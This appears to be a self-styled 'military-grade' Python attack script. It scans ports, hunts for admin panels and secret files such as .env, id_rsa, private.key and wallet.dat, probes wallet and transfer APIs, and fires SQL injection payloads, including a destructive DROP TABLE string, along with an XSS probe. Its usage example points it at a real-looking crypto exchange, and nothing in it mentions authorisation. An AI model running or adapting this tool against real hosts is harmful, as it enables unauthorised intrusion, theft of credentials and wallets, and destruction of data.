#!/usr/bin/env python3
"""
MAKV'S MILITARY-GRADE PENETRATION TESTING ENGINE
NO DEPENDENCIES - PURE PYTHON POWER
"""

import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
import json
import re
import time
import threading
from datetime import datetime
import subprocess
import sys
import os

class MakvPenetrationEngine:
    def __init__(self):
        self.results = {
            'target': '',
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'critical_findings': [],
            'admin_panels': [],
            'exposed_files': [],
            'api_endpoints': [],
            'security_headers': {},
            'open_ports': [],
            'subdomains': []
        }
        
    def banner(self):
        print("""
🎯 MAKV'S MILITARY-GRADE PENETRATION ENGINE
═══════════════════════════════════════════════
NO DEPENDENCIES - PURE PYTHON POWER
DESIGNED TO PENETRATE ANY SYSTEM
""")

    def test_target(self, target):
        """Main penetration testing method"""
        self.results['target'] = target
        print(f"🎯 TARGET: {target}")
        print("═" * 50)
        
        # Phase 1: Basic Reconnaissance
        print("📡 PHASE 1: RECONNAISSANCE")
        self.basic_recon(target)
        
        # Phase 2: Port Scanning
        print("\n🔍 PHASE 2: PORT SCANNING")
        self.port_scan(target)
        
        # Phase 3: HTTP Analysis
        print("\n🌐 PHASE 3: HTTP ANALYSIS")
        self.http_analysis(target)
        
        # Phase 4: Admin Panel Discovery
        print("\n👑 PHASE 4: ADMIN PANEL DISCOVERY")
        self.admin_panel_discovery(target)
        
        # Phase 5: File Discovery
        print("\n📁 PHASE 5: SENSITIVE FILE DISCOVERY")
        self.file_discovery(target)
        
        # Phase 6: API Discovery
        print("\n🔌 PHASE 6: API ENDPOINT DISCOVERY")
        self.api_discovery(target)
        
        # Phase 7: Vulnerability Testing
        print("\n💥 PHASE 7: VULNERABILITY TESTING")
        self.vulnerability_testing(target)
        
        # Generate Report
        print("\n📊 GENERATING REPORT...")
        self.generate_report()
        
        return self.results

    def basic_recon(self, target):
        """Basic reconnaissance without external dependencies"""
        try:
            # DNS Resolution
            ip = socket.gethostbyname(target)
            print(f"✅ IP Address: {ip}")
            self.results['ip_address'] = ip
            
            # Basic HTTP check
            try:
                response = urllib.request.urlopen(f"http://{target}", timeout=5)
                print(f"✅ HTTP Status: {response.getcode()}")
                self.results['http_status'] = response.getcode()
            except:
                print("❌ HTTP not accessible")
                
            # HTTPS check
            try:
                response = urllib.request.urlopen(f"https://{target}", timeout=5)
                print(f"✅ HTTPS Status: {response.getcode()}")
                self.results['https_status'] = response.getcode()
            except:
                print("❌ HTTPS not accessible")
                
        except Exception as e:
            print(f"❌ Reconnaissance failed: {e}")

    def port_scan(self, target):
        """Scan common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 27017]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    print(f"✅ Port {port} OPEN")
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        self.results['open_ports'] = open_ports
        print(f"📊 Found {len(open_ports)} open ports")

    def http_analysis(self, target):
        """Analyze HTTP headers and security"""
        try:
            req = urllib.request.Request(f"https://{target}")
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            response = urllib.request.urlopen(req, timeout=10)
            headers = dict(response.headers)
            
            # Check security headers
            security_headers = {
                'X-Frame-Options': headers.get('X-Frame-Options', 'MISSING'),
                'X-XSS-Protection': headers.get('X-XSS-Protection', 'MISSING'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'MISSING'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'MISSING'),
                'Content-Security-Policy': headers.get('Content-Security-Policy', 'MISSING')
            }
            
            self.results['security_headers'] = security_headers
            
            for header, value in security_headers.items():
                if value == 'MISSING':
                    print(f"❌ {header}: MISSING (VULNERABILITY)")
                    self.results['vulnerabilities'].append(f"Missing {header}")
                else:
                    print(f"✅ {header}: {value}")
                    
        except Exception as e:
            print(f"❌ HTTP analysis failed: {e}")

    def admin_panel_discovery(self, target):
        """Discover admin panels and sensitive directories"""
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin/', '/wp-admin',
            '/cpanel', '/control', '/dashboard', '/manage', '/panel',
            '/login', '/signin', '/auth', '/secure', '/private',
            '/api/admin', '/admin/login', '/admin/dashboard',
            '/phpmyadmin', '/adminer', '/dbadmin'
        ]
        
        found_panels = []
        
        for path in admin_paths:
            try:
                url = f"https://{target}{path}"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                
                response = urllib.request.urlopen(req, timeout=5)
                if response.getcode() == 200:
                    print(f"🚨 ADMIN PANEL FOUND: {url}")
                    found_panels.append(url)
                    self.results['critical_findings'].append(f"Admin panel accessible: {url}")
                    
            except urllib.error.HTTPError as e:
                if e.code == 401 or e.code == 403:
                    print(f"🔒 PROTECTED ADMIN: {url} (Status: {e.code})")
                    found_panels.append(f"{url} (Protected)")
            except:
                pass
                
        self.results['admin_panels'] = found_panels
        print(f"📊 Found {len(found_panels)} admin interfaces")

    def file_discovery(self, target):
        """Discover sensitive files"""
        sensitive_files = [
            '/.env', '/config.php', '/database.yml', '/wp-config.php',
            '/config.json', '/.git/config', '/backup.sql', '/dump.sql',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config',
            '/wallet.dat', '/private.key', '/id_rsa', '/id_dsa'
        ]
        
        found_files = []
        
        for file_path in sensitive_files:
            try:
                url = f"https://{target}{file_path}"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                
                response = urllib.request.urlopen(req, timeout=5)
                if response.getcode() == 200:
                    content = response.read().decode('utf-8', errors='ignore')[:500]
                    print(f"🚨 SENSITIVE FILE: {url}")
                    found_files.append({'url': url, 'preview': content[:100]})
                    
                    # Check for critical patterns
                    if 'password' in content.lower() or 'secret' in content.lower():
                        print(f"💀 CRITICAL: Contains credentials!")
                        self.results['critical_findings'].append(f"Credentials exposed in {url}")
                        
            except:
                pass
                
        self.results['exposed_files'] = found_files
        print(f"📊 Found {len(found_files)} exposed files")

    def api_discovery(self, target):
        """Discover API endpoints"""
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
            '/api/users', '/api/admin', '/api/auth', '/api/login',
            '/api/wallet', '/api/transfer', '/api/balance',
            '/v1/api', '/v2/api', '/rest/api', '/json/api'
        ]
        
        found_apis = []
        
        for path in api_paths:
            try:
                url = f"https://{target}{path}"
                req = urllib.request.Request(url)
                req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                req.add_header('Accept', 'application/json')
                
                response = urllib.request.urlopen(req, timeout=5)
                if response.getcode() == 200:
                    content_type = response.headers.get('Content-Type', '')
                    if 'json' in content_type.lower():
                        print(f"🔌 API ENDPOINT: {url}")
                        found_apis.append(url)
                        
                        # Check if it returns sensitive data
                        content = response.read().decode('utf-8', errors='ignore')
                        if any(keyword in content.lower() for keyword in ['token', 'key', 'secret', 'password']):
                            print(f"💀 CRITICAL: API exposes sensitive data!")
                            self.results['critical_findings'].append(f"Sensitive API data: {url}")
                            
            except:
                pass
                
        self.results['api_endpoints'] = found_apis
        print(f"📊 Found {len(found_apis)} API endpoints")

    def vulnerability_testing(self, target):
        """Test for common vulnerabilities"""
        vulnerabilities = []
        
        # Test for SQL injection
        print("🔍 Testing SQL Injection...")
        sql_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
        
        for payload in sql_payloads:
            try:
                url = f"https://{target}/search?q={urllib.parse.quote(payload)}"
                req = urllib.request.Request(url)
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if any(error in content.lower() for error in ['sql', 'mysql', 'postgresql', 'syntax error']):
                    print(f"🚨 SQL INJECTION VULNERABILITY DETECTED!")
                    vulnerabilities.append("SQL Injection")
                    self.results['critical_findings'].append("SQL Injection vulnerability")
                    break
            except:
                pass
        
        # Test for XSS
        print("🔍 Testing XSS...")
        xss_payload = "<script>alert('XSS')</script>"
        try:
            url = f"https://{target}/search?q={urllib.parse.quote(xss_payload)}"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=5)
            content = response.read().decode('utf-8', errors='ignore')
            
            if xss_payload in content:
                print(f"🚨 XSS VULNERABILITY DETECTED!")
                vulnerabilities.append("Cross-Site Scripting (XSS)")
                self.results['critical_findings'].append("XSS vulnerability")
        except:
            pass
            
        self.results['vulnerabilities'].extend(vulnerabilities)
        print(f"📊 Found {len(vulnerabilities)} vulnerabilities")

    def generate_report(self):
        """Generate comprehensive penetration test report"""
        print("\n" + "="*60)
        print("🎯 MAKV'S PENETRATION TEST REPORT")
        print("="*60)
        print(f"Target: {self.results['target']}")
        print(f"Timestamp: {self.results['timestamp']}")
        print(f"IP Address: {self.results.get('ip_address', 'Unknown')}")
        
        print(f"\n🚨 CRITICAL FINDINGS: {len(self.results['critical_findings'])}")
        for finding in self.results['critical_findings']:
            print(f"  💀 {finding}")
            
        print(f"\n👑 ADMIN PANELS: {len(self.results['admin_panels'])}")
        for panel in self.results['admin_panels']:
            print(f"  🔑 {panel}")
            
        print(f"\n📁 EXPOSED FILES: {len(self.results['exposed_files'])}")
        for file_info in self.results['exposed_files']:
            print(f"  📄 {file_info['url']}")
            
        print(f"\n🔌 API ENDPOINTS: {len(self.results['api_endpoints'])}")
        for api in self.results['api_endpoints']:
            print(f"  🔗 {api}")
            
        print(f"\n🔍 VULNERABILITIES: {len(self.results['vulnerabilities'])}")
        for vuln in self.results['vulnerabilities']:
            print(f"  ⚠️  {vuln}")
            
        print(f"\n🔓 OPEN PORTS: {len(self.results['open_ports'])}")
        for port in self.results['open_ports']:
            print(f"  🚪 {port}")
            
        # Save report to file
        report_file = f"penetration_report_{self.results['target']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n💾 Report saved to: {report_file}")
        except Exception as e:
            print(f"❌ Failed to save report: {e}")
            
        print("\n" + "="*60)
        print("🎯 PENETRATION TEST COMPLETE")
        print("="*60)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 fixed_penetration_engine.py <target>")
        print("Example: python3 fixed_penetration_engine.py youngplatform.com")
        sys.exit(1)
        
    target = sys.argv[1].replace('http://', '').replace('https://', '').strip('/')
    
    engine = MakvPenetrationEngine()
    engine.banner()
    
    try:
        results = engine.test_target(target)
        
        # Summary
        critical_count = len(results['critical_findings'])
        if critical_count > 0:
            print(f"\n🚨 CRITICAL: Found {critical_count} critical security issues!")
            print("💀 This system can be compromised!")
        else:
            print(f"\n✅ No critical vulnerabilities found in basic scan")
            print("🛡️ System appears to have basic security measures")
            
    except KeyboardInterrupt:
        print("\n❌ Scan interrupted by user")
    except Exception as e:
        print(f"\n❌ Scan failed: {e}")

if __name__ == "__main__":
    main()